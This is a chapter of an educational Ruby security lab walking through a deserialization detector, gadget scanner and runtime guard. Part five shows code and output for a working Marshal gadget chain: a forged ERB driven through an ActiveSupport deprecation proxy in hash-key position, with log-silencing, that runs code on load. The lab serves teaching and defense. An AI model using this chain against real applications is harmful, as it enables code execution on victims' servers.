<!-- ©AngelaMos | 2026 -->
<!-- 03-IMPLEMENTATION.md -->

# marshalsea: Implementation

A code walkthrough, in the order data actually moves: bytes into a graph, a graph into a decision, a live class graph into a list of gadgets, and a live object into a payload. Open the files alongside this. Nothing here quotes a line number, because line numbers rot; everything is named by method.

Every transcript in this chapter was produced by running the code in `ruby:4.0-slim` (Ruby 4.0.6). If you run the same thing and get something different, believe your terminal.

## Part one: bytes into a graph

`Marshalsea::Marshal::Parser` is a recursive-descent reader over the Marshal wire format. Start with the simplest possible dumps and read the bytes:

```
Marshal.dump(nil)      "\x04\b0"
Marshal.dump(true)     "\x04\bT"
Marshal.dump(1)        "\x04\bi\x06"
Marshal.dump(:hi)      "\x04\b:\ahi"
Marshal.dump("hi")     "\x04\bI\"\ahi\x06:\x06ET"
Marshal.dump([1, 2])   "\x04\b[\ai\x06i\a"
Marshal.dump({a: 1})   "\x04\b{\x06:\x06ai\x06"
```

`"\x04\b"` is the version header, major 4 minor 8, on every stream. After that it is one tag byte and then whatever that tag needs.

### The dispatch

`read_value` is a `case` over the tag byte and it is the whole grammar. The interesting thing about it is what it does *not* do: there is no class resolution, no `const_get`, no allocation of anything from the stream. A `TAG_OBJECT` produces a `Node` with `type: :object` and a `class_name` string. The string `"Gem::Requirement"` never becomes the constant `Gem::Requirement`.

Three arms of that case are the sinks:

```ruby
when TAG_USERDEF     then register(read_userdef(tag, depth))      # u -> Klass._load
when TAG_USERMARSHAL then read_usermarshal(tag, depth)            # U -> obj.marshal_load
when TAG_DATA        then read_wrapped(tag, :data, depth)         # d -> Klass._load_data
```

Everything downstream that reasons about sinks reads `Node#sink?` and `Node#sink_method`, which are lookups in a frozen constant table keyed by tag. Adding a fourth sink tag means adding one entry, not editing a predicate.

### Fixnum packing, because you will hit it immediately

`read_fixnum` implements Marshal's variable-width integer, and it is worth understanding because *every* length in the format is one:

```ruby
marker = take_signed_byte
return 0 if marker.zero?
return marker - FIXNUM_INLINE_OFFSET if marker > FIXNUM_MAX_INLINE   # marker >  4
return marker + FIXNUM_INLINE_OFFSET if marker < FIXNUM_MIN_INLINE   # marker < -4
# otherwise |marker| is a BYTE COUNT, and the value follows little-endian
```

So small integers are inline with a bias of 5, and larger ones declare a width. Now the byte string above decodes on sight:

```
"\x04\b{\x06:\x06ai\x06"
        ^^^^                 marker 6, so fixnum 1: the hash has 1 entry
            ^^^^             marker 6, so 1: the symbol name is 1 byte
                ^            "a"
                 ^^^^^^      tag i, marker 6, so the value is 1
```

And class-name lengths work identically. `"\x15Gem::Requirement"` is marker 0x15 = 21, so 21 - 5 = 16 bytes of name, and `"Gem::Requirement".length` is 16.

### The two back-reference tables

Marshal deduplicates, and both mechanisms are index-based. This matters more than it looks.

**Symbols** go in a table as they are defined. `TAG_SYMBOL` appends to `symbols`; `TAG_SYMLINK` reads an index back out. **Objects** go in a separate table via `register`, and `TAG_OBJECT_LINK` reads an index out of that one. `read_symlink` and `read_object_link` both bounds-check and raise `InvalidLinkError` on a negative or out-of-range index, because an out-of-range link is a stream claiming a reference to an object that does not exist.

Dumping two `Gem::Version`s shows both tables working:

```
"\x04\b[\aU:\x11Gem::Version[\x06I\"\x061\x06:\x06ETU;\x00[\x06I\"\x062\x06;\x06T"
                                                          ^^^^                      symlink 0 -> :"Gem::Version"
                                                                              ^^^^  symlink 1 -> :E
```

The second `Gem::Version` is not spelled out; it is `;\x00`, symlink index zero. Any code that reasons about "which classes are in this stream" has to resolve symlinks or it will miss the second one entirely. `Node` stores the resolved symbol value at parse time so downstream consumers never have to think about it.

Object links are the ones that bite. `Node#link_target` is set to the actual registered node, and `effective_class_name` follows it:

```ruby
def effective_class_name
  link_target ? link_target.class_name : class_name
end
```

Without that, a payload that puts the dangerous object in value position and then references it by index from key position would show a key whose own `class_name` is `nil`. The corpus has that exact case (`hash_key_object_link`), and it rejects.

### Budgets are charged at the point of consumption

`Budget` is threaded through the parser and every read charges it before it allocates. `read_counted_bytes` charges `scalar!(size)` **before** `take(size)`, so a stream declaring a 900 MB string is refused at the declaration rather than after the allocation. `read_entry_count` charges before the loop. `register` charges before appending.

That ordering is the entire point of having a budget:

```
DepthLimitError:      exceeded depth 4
LimitExceededError:   stream bytes 110 exceeds 8
```

### Sealing

`parse` finishes with `root.each(&:seal)` and returns a frozen `Result`. `Node#seal` freezes the value, the class name, the undecoded tail, both children arrays, both instance-variable collections, and finally the node. The graph handed back is immutable, so a caller holding a `Decision#result` cannot mutate the record a policy decision was made from.

## Part two: the graph answers questions

`Result` is a set of queries over the frozen graph. `nodes` is `root.each`, a depth-first enumerator that walks children **and** the `auxiliary` array, which is where class-name symbols and instance-variable name/value pairs live. Missing `auxiliary` would mean missing anything hidden in a name slot, which is exactly the anomaly case the parser exists to preserve.

```ruby
def class_names = nodes.filter_map(&:class_name).uniq
def sinks       = nodes.select(&:sink?)
```

Run it on a real stream:

```ruby
blob = Marshal.dump(Gem::Requirement.new(">= 0"))
r    = Marshalsea::Marshal::Parser.new(blob).parse

r.class_names
# => ["Gem::Requirement", "Gem::Version"]
r.sinks.map { |s| "#{s.class_name}##{s.sink_method}" }
# => ["Gem::Requirement#marshal_load", "Gem::Version#marshal_load"]
```

62 bytes, two classes, two `marshal_load` dispatches, and nothing was loaded.

### Key-position dispatch is a recursive question

`hash_keys` collects the first element of every `:pair` under every `:hash`. Then each key is asked whether reviving it dispatches `#hash` or `#eql?`. That question is not "is this key an object," because the dangerous thing can be **nested**:

```ruby
def hash_dispatcher(seen = {}.compare_by_identity)
  return nil if seen.key?(self)

  seen[self] = true
  return link_target&.hash_dispatcher(seen) if type == :object_link
  return member_dispatcher(:hash_dispatcher, seen) unless class_name
  return nil if WRAPPER_TYPES.include?(type) && string_backed?

  self
end
```

Four behaviours in six lines:

- **Cycle safety.** `seen` is identity-compared, so a graph with an object link pointing back into its own ancestry terminates instead of recursing forever.
- **Follow links.** An object link delegates to whatever it points at.
- **Descend into containers.** A node with no `class_name` is a plain container, so ask its members. That is what catches `{ [gadget] => 1 }`, the bare-Array-key bypass, in 19 bytes.
- **Respect the String fast path.** `WRAPPER_TYPES` is `:user_class` and `:extended`, and `string_backed?` checks whether the wrapped node is a string or regexp. A `String` subclass used as a hash key **never has `#hash` called**, because CRuby's `rb_any_hash` special-cases `T_STRING`. Reporting it would be a false positive.

`eql_dispatcher` is nearly identical and deliberately **omits** the last clause. A `String` subclass skips `#hash` but still reaches `#eql?` on bucket collision. Two methods that look like copy-paste differ by exactly one line, and that one line is a shipped bypass.

Ranges get their own path. `range_endpoints` reads the `begin` and `end` instance variables of any node whose `effective_class_name` is `"Range"`, because `Range#marshal_load` validates its endpoints with `#<=>`.

## Part three: the graph becomes a decision

`BoundaryDetector#inspect_stream` is short enough to read whole:

```ruby
def inspect_stream(input)
  return reject(REASON_INPUT_TYPE) unless input.is_a?(String)

  snapshot = input.dup.force_encoding(Encoding::BINARY).freeze
  result = Parser.new(snapshot, limits: limits).parse
  evaluate(result, snapshot)
rescue StreamError => e
  reject(format(REASON_MALFORMED, e.class.name.split("::").last))
end
```

Three things to notice. The input is **duplicated, binary-forced, and frozen** before anything reads it, so the caller cannot mutate the bytes between the decision and the load (`decision.snapshot` is what you should hand to `Marshal.load`, not the original). Every parser error is caught as its base class `StreamError`, so a new error type added to the parser cannot leak out as an unhandled exception. And the reason string carries only the **error class name**, not its message, because the message can contain attacker-influenced offsets and sizes.

`violation_for` is the ladder from [02-ARCHITECTURE.md](./02-ARCHITECTURE.md), in order, returning the first hit. Then `evaluate` turns a violation into one of three states, and monitoring mode is the only branch that calls the reporter and still hands back a snapshot.

Watching all three states on real payloads:

```
usermarshal sink        blocked  stream reaches "Gem::Requirement"#marshal_load during load, before any
                                 allowlist can run
object in key position  blocked  stream reaches "Gem::Version"#marshal_load during load, before any
                                 allowlist can run
bare Array key          blocked  stream puts "Ungated" in a hash key, so its #hash runs during load,
                                 before any allowlist can act
Range endpoint          blocked  stream puts "Ungated" in a Range endpoint, so its #<=> runs during
                                 load, before any allowlist can act
benign 45-byte session  proceed
same session with ERB   blocked  stream references unapproved class "ERB"
```

And the third state, which is the one people forget exists:

```
state=observed  proceed?=false  blocked?=false  observed?=true
snapshot present=true  reported=1
```

`observed` is not `proceed`. A caller who writes `Marshal.load(d.snapshot) if d.proceed?` gets the safe behaviour in monitoring mode for free, which is why there is no `accepted?` predicate to get this wrong with.

Note the last reason string in that transcript. `"stream references unapproved class \"ERB\""` is the **only** rule that catches the published CVE chain, because that payload contains no sink tag at all:

```ruby
Marshalsea::Chains::ErbDefMethod.canary("/tmp/c", "m").serialize
# 112 bytes
# class_names = ["ERB"]
# sinks       = 0        <-- zero sink tags
```

That fact is written into `LIMITATION_NOTICE` as a constant rather than left in a doc, so a caller who greps the library for its own caveats finds it.

## Part four: hunting the class graph

`Scanner#scan` walks `ObjectSpace.each_object(Module)`, and for each named module collects the auto-invoked methods the module defines **itself**:

```ruby
def own_instance_methods(mod, name)
  (mod.instance_methods(false) +
   mod.private_instance_methods(false) +
   mod.protected_instance_methods(false)).map(&:to_s)
rescue StandardError => e
  suppress(SITE_OWN_METHODS, name, e)
  []
end
```

`false` means "not inherited," which is the difference between finding the class that *defines* a gadget and finding all 400 of its subclasses. Private and protected are included because `Marshal` gates on `respond_to?(m, true)`, and that `true` means private methods count.

Every one of these helpers has the same shape: rescue, `suppress` with a named site, return an empty result. Nothing raises out of a scan, and nothing is lost silently.

### Deciding whether an ungated method is interesting

For a gated method the tag alone reaches it, so it is reachable by definition. For an ungated one like `#hash`, the scanner has to guess whether the body does anything. `state_reference_in` parses the defining file with Prism, finds the `DefNode` at the method's `source_location` line, and asks:

```ruby
def state_reference?(node)
  return false unless node.is_a?(Prism::Node)
  return true if node.is_a?(Prism::InstanceVariableReadNode)
  return true if node.is_a?(Prism::CallNode) && node.receiver.nil?

  node.compact_child_nodes.any? { |child| state_reference?(child) }
end
```

Reads an instance variable, or makes a receiverless call. A `#hash` returning a literal is inert; a `#hash` reading `@name` or calling a sibling method is a potential pivot. Parsed files are cached by path, because Prism-parsing `rubygems/specification.rb` once per candidate would be slow and pointless.

The failure directions are the interesting part. No Prism, or no source location at all, gives `:unanalysable`. A file that will not parse, or a line with no `DefNode`, gives `:unreadable`. And then:

```ruby
def reachable?
  return false unless entry_point?
  return false unless accepts_dispatch?
  return true if gated? || soft_gated?

  touches_state? || unreadable_source?
end
```

`unreadable_source?` counts as reachable. When the tool cannot tell, it says "maybe dangerous," not "inert." On a stock image that is 8 candidates:

```
unreadable_source candidates: 8
  ERB::Compiler::PercentLine#to_s     reachable=false      <- a LINK, excluded before this ever ran
  Pathname#==                         reachable=true
  Pathname#eql?                       reachable=true
  Pathname#hash                       reachable=true
  Pathname#to_s                       reachable=false
  Ractor#[]=                          reachable=true
  Symbol#to_s                         reachable=false
```

The `to_s` rows are the taxonomy earning its place. They are unreadable *and* they are links, and `entry_point?` rejects them before the state analysis matters at all.

The 142 `unanalysable` candidates are C-defined methods with no Ruby source. `fully_analysed?` returns false and the scan says so in plain English rather than printing a clean-looking list.

### The arity gate

```ruby
def accepts_dispatch?
  required = dispatch_arity
  return true if required == VARIADIC
  return arity == required unless arity.negative?

  required >= (arity.abs - 1)
end
```

A negative `Method#arity` means optional or splat arguments, and `arity.abs - 1` is the count of required ones, so the check is "the deserializer supplies at least as many as this method requires." On a stock image it rejects exactly one candidate, and it is a good one:

```
entry points whose arity cannot accept the deserializer's call: 1
  Psych::Visitors::ToRuby#init_with               arity=3    needs=1
```

Psych's own visitor method shares a name with the hook it dispatches. Without the arity column that would sit at the top of every scan forever.

## Part five: building the payload

This is the showpiece. `erb-def-module` fires inside `Marshal.load` with no cooperation from the application, and it takes three separate tricks to get there.

### Trick one: forge the ERB past the guard

CVE-2026-41316 is a guard that covers `ERB#result` and `ERB#run` but not `ERB#def_method`. The forge is three instance variables on an allocated object, and it deliberately never calls `ERB#initialize`, because `initialize` is what sets `@_init`:

```ruby
def template
  object = ERB.allocate
  object.instance_variable_set(IVAR_SRC, src)
  object.instance_variable_set(IVAR_FILENAME, DEFAULT_FILENAME)
  object.instance_variable_set(IVAR_LINENO, DEFAULT_LINENO)
  object
end
```

`@src` is the compiled template source that `def_method` will `module_eval`. And `src` is where the actual primitive lives:

```ruby
SRC_PREFIX = "#\nend\n"
SRC_SUFFIX = "\ndef _marshalsea_unused\n"

def src = "#{SRC_PREFIX}#{@ruby_source}#{SRC_SUFFIX}"
```

Six characters at the front and twenty-four at the back, and both ends are load-bearing. `ERB#def_method` builds the method like this, read from the shipped source:

```ruby
src = self.src.sub(/^(?!#|$)/) { "def #{methodname}\n" } << "\nend\n"
```

It does not prepend. It inserts `def <name>` before the **first line that is neither a comment nor blank**, because a real compiled ERB `@src` opens with `#coding:UTF-8` and that magic comment has to stay on line one. So `SRC_PREFIX`'s leading `#` is a forged magic comment whose only job is to push the insertion point one line down, onto the `end`:

```ruby
#                                     # forged magic comment, the sub skips it
def render_it                         # the wrapper lands on the `end` line
end                                   # and closes immediately: an empty method
File.write("/tmp/canary", "pwned")    # now at module_eval top level
def _marshalsea_unused                # a second empty method, which absorbs the
                                      # "\nend\n" that def_method appends
end
```

Run that through `module_eval` and the payload executes during `eval`, with two empty methods left behind as debris:

```
fired during eval: [:RAN_AT_EVAL_TIME]
methods defined:   [:_marshalsea_unused, :render_it]
```

That converts "defines a method containing my code" into "**runs my code now**," which is the difference between a payload that waits for someone to call a method and a payload that fires during load. It is the whole reason the advisory calls `def_method` exploitable rather than merely unguarded.

### Trick two: get something to call `def_module` for you

The forged ERB is inert until something calls a `def_*` method on it. `ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy` is a `method_missing` dispatcher: it forwards any missing method to `@instance.send(@method)`. Set those two ivars and the proxy becomes a trigger:

```ruby
def generate
  proxy = self.class.dispatcher_class.allocate
  SET_IVAR.bind_call(proxy, IVAR_INSTANCE, template)      # the forged ERB
  SET_IVAR.bind_call(proxy, IVAR_METHOD, DISPATCH_METHOD) # :def_module
  SET_IVAR.bind_call(proxy, IVAR_VAR, PROXY_LABEL)
  SET_IVAR.bind_call(proxy, IVAR_DEPRECATOR, deprecator)
  proxy
end
```

`def_module` is chosen over `def_method` for one reason: **it takes no arguments**, so a blind `send` with no arguments reaches it. `def_method` needs a module and a name, which a `method_missing` forwarder is not going to supply.

Note `SET_IVAR.bind_call`. That is `Object.instance_method(:instance_variable_set)`, captured once at load time and bound to the proxy. A plain `proxy.instance_variable_set(...)` would go through the proxy's own `method_missing`, which forwards to `@instance` and fires the chain while you are still building it. The proxy is hostile to its own constructor.

`deprecator` builds a silenced `ActiveSupport::Deprecation` so the proxy does not print a deprecation warning on the way through, which would announce the payload in the target's logs.

### Trick three: put it in key position without running it

The proxy fires on `#hash`. Building `{ proxy => 1 }` in Ruby calls `#hash` on the key at insertion time, in **your** process. So the builder never constructs the hash:

```ruby
def in_hash_key_position(object)
  body   = ::Marshal.dump(object).byteslice(HEADER_BYTES..)
  header = ::Marshal.dump(nil).byteslice(0, HEADER_BYTES)
  refuse_object_links("#{header}#{HASH_WITH_ONE_ENTRY}#{body}#{NIL_VALUE}".b)
end
```

`HASH_WITH_ONE_ENTRY` is `"{\x06"`, the hash tag plus an inline fixnum 1. `NIL_VALUE` is `"0"`. So the payload is assembled as bytes: a header, a one-entry hash frame, the standalone dump of the proxy spliced in as the key, and a `nil` value. `Marshal.dump` is called on the proxy alone, which never puts it in a hash, which never calls `#hash`.

And then the refusal:

```ruby
def refuse_object_links(stream)
  graph = Marshalsea::Marshal::Parser.new(stream).parse
  return stream if graph.nodes.none? { |node| node.type == :object_link }

  raise ObjectLinkRefusedError, OBJECT_LINK_REFUSED
end
```

Object links are positional. `@6` means "the sixth registered object," and splicing a body behind a hash node shifts every index by one. A payload graph containing a back-reference would silently decode into a *different graph* than the one that was built. So the builder parses its own output with the library's own parser and refuses if any link survived. A payload generator that can produce a graph it did not intend is worse than one that refuses to produce anything.

That is also a nice closed loop: the offensive half validates itself with the defensive half's reader.

### The whole thing, end to end

Built, serialized, inspected, and loaded on `ruby:4.0.2-slim` with erb **6.0.1**, a vulnerable version:

```
payload bytes=308
class_names=["ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy", "ERB",
             "ActiveSupport::Deprecation"]
sink tags=0
hash_dispatching_keys=["ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy"]

detector (deny_sinks_only) -> blocked: stream puts "ActiveSupport::Deprecation::
  DeprecatedInstanceVariableProxy" in a hash key, so its #hash runs during load,
  before any allowlist can act

canary2 before: false
canary2 after Marshal.load: true PWNED-VIA-LOAD
```

308 bytes, **zero sink tags**, and a file on disk after a bare `Marshal.load`. Nothing called a method on the result. The detector still refuses it, and refuses it on the key-position rule rather than the sink rule, which is why rules 3 through 5 of the ladder exist at all.

The same payload on `ruby:4.0.6-slim` with erb **6.0.4**, one `docker pull` away, does not get that far. Ruby prints the chain for you on the way out:

```
ERB#def_method: not initialized (ArgumentError)
  from ERB#def_module
  from ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy#target
  from ActiveSupport::Deprecation::DeprecationProxy#method_missing
  from proxy.hash
```

Read that stack bottom to top and it is the chain diagram from [01-CONCEPTS.md](./01-CONCEPTS.md), written by the interpreter. The `not initialized` at the top is the CVE-2026-41316 patch: one `@_init` check added to `def_method`, closing `def_module` and `def_class` with it.

## Part six: the runtime veto

`LoadGuard#load` is small because `TracePoint` does the work:

```ruby
def load(blob)
  seen = []
  tracer = TracePoint.new(*EVENTS) { |event| inspect_event(event, seen) }
  result = nil
  begin
    tracer.enable { result = ::Marshal.load(blob) }
  ensure
    @observations = seen.freeze
  end
  result
end
```

`EVENTS` is `[:call, :c_call]`. A `:call` event fires **at method entry, before the body**, which is precisely the veto point the allowlist proc denies you. `inspect_event` filters to the watched hooks, resolves the receiver's class name, records an `Observation`, and raises if the owner is not permitted:

```ruby
permitted = !owner.nil? && permitted_class_names.include?(owner)
seen << Observation.new(class_name: label, method_name: event.method_id, permitted: permitted)
return if permitted

raise GuardedLoadError, format(REASON, label, event.method_id)
```

The `!owner.nil? &&` is not decoration. An anonymous class has a `nil` name, and `[].include?(nil)` is false, but a permitted-list containing `nil` would match it. Failing closed on an unnameable owner is the right direction, and the observation still records it as `"(class with no name)"` so the veto is explainable afterwards.

### The invariant that makes the veto real

`owner_name` resolves the receiver's class **without dispatching a single method on the receiver**:

```ruby
CLASS_OF = ::Object.instance_method(:class).freeze
KIND_OF  = ::Object.instance_method(:is_a?).freeze
NAME_OF  = ::Module.instance_method(:name).freeze

def owner_name(receiver)
  owner = KIND_OF.bind_call(receiver, ::Module) ? receiver : CLASS_OF.bind_call(receiver)
  name = NAME_OF.bind_call(owner)
  name if name.is_a?(String) && !name.empty?
rescue StandardError
  nil
end
```

That looks like paranoia until you remember what the guard is inspecting. **The receiver is the gadget.** A method-erased proxy answers `.class`, `.is_a?`, and `.name` through `method_missing`, and on the chain this lab ships, `method_missing` is the trigger. A guard written the obvious way, `receiver.is_a?(Module) ? receiver : receiver.class`, therefore *fires the chain while deciding what to call it*, and then vetoes a payload that has already run.

It gets worse, because Ruby does not trace a `TracePoint` handler's own nested calls. Confirmed:

```
methods traced with a plain handler:                     [:outer, :inner]
methods traced when the handler itself calls :inner:     [:outer, :inner]
```

`:inner` appears once, not twice. So the detonation triggered from inside the handler is invisible to the guard *and* unguarded by it.

The failure is loud once you know the fingerprint. Reverting the three `bind_call`s and running the shipped chain gives this:

```
strict guard: blocked -> deserialization hook (class with no name)#method_missing is not permitted
canary created? true
```

Blocked, and the payload ran anyway. `(class with no name)` is the tell: `receiver.class` had been answered by `method_missing`, which returned the anonymous `Module` that `ERB#def_module` produces, which has no name. With the unbound calls the same load reports the real owner and the canary never appears:

```
strict   vetoed: ...DeprecatedInstanceVariableProxy#method_missing is not permitted   canary_fired=false
default  vetoed: ...DeprecatedInstanceVariableProxy#method_missing is not permitted   canary_fired=false
```

`test_the_guard_never_dispatches_a_method_on_the_receiver_it_inspects` locks it in, and it is checkable in isolation: instrument a wiped proxy's `method_missing` and assert nothing in `[:class, :is_a?, :name]` was ever asked of it.

```
against the fixed guard:   dispatched on the receiver: []
against the reverted one:  dispatched on the receiver: [:is_a?, :class]
```

Generalize it before you write a guard of your own: **anything that inspects a hostile object must not ask that object questions.** Unbind the method from the class you trust and bind it to the receiver you do not.

`observations` is populated in an `ensure`, so a load that raises still leaves you the trace of what fired before it did. That is the difference between "blocked" and "blocked, and here is what it tried."

In practice:

```
benign session         -> {user: "guest", template: "hello"}, observations=[]
Gem::Requirement dump  -> vetoed: deserialization hook Gem::Version#marshal_load is not permitted
```

And the documented hole, on the same 19-byte ungated payload:

```
default guard  -> LOADED, #hash fired, watches?(:hash)=false
strict guard   -> blocked: deserialization hook OKey#hash is not permitted, #hash never fired
detector       -> blocked, nothing loaded at all
```

Three tools, three answers, one payload. The guard's own `LIMITATION_NOTICE` points at the third column as the cheaper place to catch it.

## Part seven: walking a YAML document

`Marshalsea::Psych::Walk` is a visitor over the AST that `Psych.parse_stream` returns. The only clever part is tracking key position:

```ruby
def descend(node, depth)
  children = node.children
  return unless children

  mapping = node.is_a?(::Psych::Nodes::Mapping)
  children.each_with_index do |child, index|
    visit(child, depth + 1, mapping && (index % MAPPING_KEY_STRIDE).zero?)
  end
end
```

A `Psych::Nodes::Mapping` stores its children as a flat alternating list, key, value, key, value. So even indices are keys. That single `% 2 == 0` is what lets the inspector say "this class is in a **mapping key**, so its `#hash` and `#==` run while the mapping is rebuilt," which is the YAML equivalent of the Marshal hash-key rule and is checked first in `violation_for` for the same reason.

`record` is the other half:

```ruby
kind, class_name = Tags.parse(node.tag)
return unless kind

@references << Reference.new(class_name: class_name, kind: kind, key_position: key_position)
```

`Tags::PATTERN` is `%r{\A!ruby/(?<kind>[a-z_-]+)(?::(?<class_name>.+))?\z}`, anchored at both ends so a tag that merely *contains* `!ruby/` does not match. The class name is optional because `!ruby/object` with no class is a legal tag that revives nothing nameable, and `revivable` filters those out before the allowlist check so a nameless tag cannot be "unapproved."

Aliases increment a counter and are never expanded. The limits are checked inside `visit`, so depth, node count, and alias count all fail before the walk continues rather than after it completes.

```ruby
insp.inspect_document("--- !ruby/object:Gem::Version\nversion: '1'\n")
# blocked: document revives unapproved class "Gem::Version" through init_with
```

Note "through `init_with`." The reason string names the method the tag would dispatch, not just the class, which is the whole reason the tag-to-method table exists.

## Part eight: how any of this is known to work

The discipline here is that **a green suite proves nothing until the thing under test has been mutated.** 268 tests across seven suites is a number, not an argument. Three specific practices are what make it an argument.

**Differential oracles.** The tests do not assert against a spec-derived model of what Ruby does. They run real `Marshal.load` and real `Psych` under a `TracePoint`, observe what actually dispatched, and assert the library's model agrees. That found four defects that spec-derived assertions had missed.

**Liveness guards on both directions.** A differential oracle can fail two ways: it can observe nothing (and pass vacuously) or observe everything (and prove nothing). So the assertions come in pairs:

```ruby
assert_includes observed.values, true,  "no version accepted, so the oracle is dead"
assert_includes observed.values, false, "every version accepted, so the oracle proves nothing"
```

There is a standalone `test_load_watcher_oracle_is_live` whose only job is to confirm the watcher fires on a known-good load, so the tests that depend on it cannot pass by silence.

**The showpiece test.** The two-allowlists argument is not asserted in prose anywhere in the suite. It is executed:

```ruby
assert_raises(::Psych::DisallowedClass) { ::Psych.safe_load(document, permitted_classes: []) }
assert_empty FIRED, "Psych checks the tag before revival, so init_with never ran"

FIRED.clear
::Marshal.load(Marshal.dump(MarshalGadget.new), ->(object) { object }) rescue nil
assert_equal [:marshal_load], FIRED,
             "Marshal runs its proc in r_post_proc, after load_funcall has already fired the callback"
```

Two deserializers, one idea, opposite outcomes, and the failure message explains the mechanism rather than restating the assertion. There is a companion test for the method-erased proxy that asserts the *same class* is a valid Psych entry point and an invalid Marshal one, in both directions, in one test body.

The habit generalizes and it is the thing worth stealing from this project: every rule ships with the mutant that kills it. If you add a rule claiming the code does X, go break X and watch a test go red. Twelve mutants were killed this way during development, and two detector bypasses had shipped under 110 green tests before that discipline was applied.

## Where to go next

[04-CHALLENGES.md](./04-CHALLENGES.md) is the extension track: a new chain, a scanner that follows links into real chains, closing the guard's deferred-execution bypass, and the capstone that has you break this tool with a payload it currently accepts.
